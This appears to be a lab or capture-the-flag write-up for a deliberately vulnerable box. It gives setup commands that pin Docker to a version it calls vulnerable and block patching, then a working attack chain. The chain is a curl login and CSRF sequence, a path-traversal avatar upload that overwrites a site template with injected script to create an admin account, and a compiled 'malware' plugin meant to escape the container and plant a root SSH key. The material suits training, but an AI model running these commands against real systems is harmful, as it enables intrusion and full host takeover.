# Box Write-up

# SERVER SETUP
# system update
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install -y \
    ca-certificates \
    curl \
    gnupg \
    lsb-release \
    openssh-server

# Docker Engine <= 29.6.1 install
# Add Docker's official GPG key
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
    | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
chmod a+r /etc/apt/keyrings/docker.gpg

# Add Docker repository
echo \
  "deb [arch=$(dpkg --print-architecture) \
  signed-by=/etc/apt/keyrings/docker.gpg] \
  https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" \
  | tee /etc/apt/sources.list.d/docker.list > /dev/null

apt-get update

# Install pinned version — 29.6.1 is the vulnerable version
apt-get install -y \
    docker-ce=5:29.6.1-1~ubuntu.$(lsb_release -rs)~$(lsb_release -cs) \
    docker-ce-cli=5:29.6.1-1~ubuntu.$(lsb_release -rs)~$(lsb_release -cs) \
    containerd.io

# Pin the version so apt-get upgrade doesn't patch it
apt-mark hold docker-ce docker-ce-cli containerd.io

# docker and site setup
git pull https://github.com/kalios5/Ethical-Hacking-Mod.git
cd Ethical-Hacking-Mod/
sudo chmod +x Scripts/DockerEscapeScripts/HostScripts/CronScript.sh # Allow execution of app log pull cron job script
sudo echo "*/2 * * * * CONTAINER_NAME=app /home/test-vuln/Ethical-Hacking-Mod/Scripts/DockerEscapeScripts/HostScripts/CronScript.sh >> /var/log/app.log 2>&1" >> crontab -e # cronjob entry
docker compose up --build # run application


# ATTACK SETUP
# Web Attack curl
BASE_URL="http://192.168.10.42"   # adjust for your setup

# 1) Log in, keeping cookies.
TOKEN=$(curl -s -c cookies.txt "$BASE_URL/auth/login" \
  | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/login" \
  -d "csrf_token=$TOKEN" -d "username=test" -d "password=testing123" -o /dev/null

# 2) Mint a FRESH token for the post-login session (login's session.clear()
#    wipes the one from step 1 — reusing it gives "CSRF session token is missing").
TOKEN2=$(curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/account" \
  | grep -oP 'name="csrf_token" value="\K[^"]+' | head -1)

# 3) Upload. Two `..` reaches Site/ from uploads/avatars/, then back down into app/.
curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/account"   -F "csrf_token=$TOKEN2"   -F "email=test@test.test"   -F "avatar=@payload.png;filename=../../app/templates/storefront/cart.html;type=image/png"   -o response.html -w "status=%{http_code}\n"

# visit cart page for the injected script to be executed and log into the new admin account

# Docker Escape 
gcc -O2 -Wall -o Scripts/DockerEscapeScripts/EscapePlugin/minimal-monitor Scripts/DockerEscapeScripts/monitor.c # compile malware
zip -r Scripts/DockerEscapeScripts/EscapePlugin.zip Scripts/DockerEscapeScripts/EscapePlugin # zip for plugin 

# import zip into admin pluginmanager console
# the cron job injection from EscapePlugin will execute the malicious code and the app log pull cron job will execute the escape and inject a root ssh key